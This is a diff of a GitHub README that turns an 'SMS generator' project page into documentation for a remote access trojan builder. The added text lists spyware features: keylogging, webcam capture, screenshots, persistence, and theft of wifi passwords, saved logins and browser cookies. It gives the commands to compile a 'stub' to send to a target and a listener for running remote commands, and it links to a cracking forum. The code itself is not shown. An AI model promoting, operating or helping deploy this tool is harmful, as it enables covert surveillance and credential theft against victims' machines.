@@ -5,15 +5,37 @@
 
 # About The Project
 
-![running the tool](https://i.imgur.com/l1rUSH4.jpg)
+![running the tool](https://i.imgur.com/zCQSJMu.jpg)
+![building complete](https://i.imgur.com/J0ooWYb.jpg)
 
-SMS generator. Unlimited numbers, any region, and verified
+A simple builder.
+
+ - Take camera snapshots.
+
+ - Take screenshots.
+
+ - Can Download files.
+
+ - Upload files.
+
+ - Keylogger.
+
+ - Persistence.
+
+ - Show wifi names and passwords.
+
+ - Bind with a seperate file.
+
+ - Get saved usernames and passwords.
+
+ - Get browser cookies.
+
 
 ### Installation
 
 1. Clone the repo
    ```sh
-   git clone https://github.com/herawenn/SMS-GEN
+   git clone https://github.com/herawenn/Remote-Access
    ```
 2. Install requirements
    ```sh
@@ -21,16 +43,27 @@ SMS generator. Unlimited numbers, any region, and verified
    ```
 3. Run the program
    ```sh
-   pip gen.py
+   python builder.py -ip <ip_address> -p <port_number>
    ```
 
 <!-- USAGE EXAMPLES -->
 ## Usage
 
-Choose the country code, and how many numbers you'd like to generate.
-* Saves generated numbers in `results/generated.txt`
-* Saves verified numbers in `results/valid.txt`
-* Saves non verified numbers in `results/invalid.txt`
+* **-ip** = `Set the ip address`
+*  **-p** = `Set the port number`
+*  **-i** = `Set the icon`
+*  **-f** = `Set the file to bind`
+
+! To use an icon or bind with another file, they must be in the main directory of the project
+
+`builder.py` will compile `client.py` into an executable (located in the 'dist' folder)
+This exe (also known as a 'stub') is what you will send to your target.
+
+Listen for incoming connections:
+`python server.py -ip <ip_addres> -p <port_number>`
+
+Once a connections is established, you can run commands on the target machine remotely.
+Try `Help` to get started.
 
 <!-- CONTRIBUTING -->
 ## Contributing
@@ -50,14 +83,15 @@ Don't forget to give the project a star! Thanks again!
 ## Contact
 
 [Telegram](https://t.me/mulicious) 
-[Discord](https://discord.gg/portlordss)
-Project Link: [https://github.com/herawenn/sms-gen](https://github.com/herawenn/sms-gen)
+[Discord](https://discord.gg/portlords)
+[Cracked](https://cracked.io/herawen)
+Project Link: [https://github.com/herawenn/Remote-Access](https://github.com/herawenn/Remote-Access)
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-[forks-shield]: https://img.shields.io/github/forks/herawenn/sms-gen.svg?style=for-the-badge
-[forks-url]: https://github.com/herawenn/sms-gen/network/members
-[stars-shield]: https://img.shields.io/github/stars/herawenn/sms-gen.svg?style=for-the-badge
-[stars-url]: https://github.com/herawenn/sms-gen/stargazers
-[issues-shield]: https://img.shields.io/github/issues/herawenn/sms-gen.svg?style=for-the-badge
-[issues-url]: https://github.com/herawenn/sms-gen/issues
+[forks-shield]: https://img.shields.io/github/forks/herawenn/Remote-Access.svg?style=for-the-badge
+[forks-url]: https://github.com/herawenn/Remote-Access/network/members
+[stars-shield]: https://img.shields.io/github/stars/herawenn/Remote-Access.svg?style=for-the-badge
+[stars-url]: https://github.com/herawenn/Remote-Access/stargazers
+[issues-shield]: https://img.shields.io/github/issues/herawenn/Remote-Access.svg?style=for-the-badge
+[issues-url]: https://github.com/herawenn/Remote-Access/issues
